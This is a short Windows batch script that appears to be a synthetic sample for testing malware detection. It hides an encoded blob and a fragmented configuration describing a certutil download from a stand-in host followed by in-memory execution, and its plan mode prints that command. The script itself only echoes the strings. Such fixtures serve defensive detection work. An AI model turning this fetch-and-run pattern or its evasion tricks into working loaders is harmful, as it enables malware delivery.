@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|xor_5a
rem HUNTRESS-MATERIAL:LGdrJikuPyopZzs5Ky8zKD8FKD83NS4/dj4zKSo7LjkyBTc/NzUoIyY7PjsqLj8oZzk/KC4vLjM2dD8iPyYpLjs9PwU5NS80LmdrJj0oOyoyZzw7NjY4OzkxBSg/LigjJjQ/Ii4FNjs0PS87PT9nNDU0PyY5OzcqOzM9NAUzPmc5OzcqOzM9NHc/aWs8O25iPmxrJi8oNmcyLi4qKWB1dT9pazw7bmI+bGt0PyI7Nyo2P3QzNCw7NjM+dTtqam5qOWI7dD47Lg==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapter=c"& rem HUNTRESS quote compound
set "fragment1=ertutil.exe|stage_count=1|graph=fallback_retry|nex"& rem HUNTRESS quote compound
set "fragment2=t_language=none|campaign_id=campaign-e31fa48d61|ur"& rem HUNTRESS quote compound
set "fragment3=l=https://e31fa48d61.example.invalid/a0040c8a.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
ver >nul
if errorlevel 1 exit /b 1
set "recovered_configuration="
for %%G in (0 1 2 3) do call set "recovered_configuration=%%recovered_configuration%%%%fragment%%G%%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo certutil.exe GET https://e31fa48d61.example.invalid/a0040c8a.dat then dispatch memory
exit /b 0
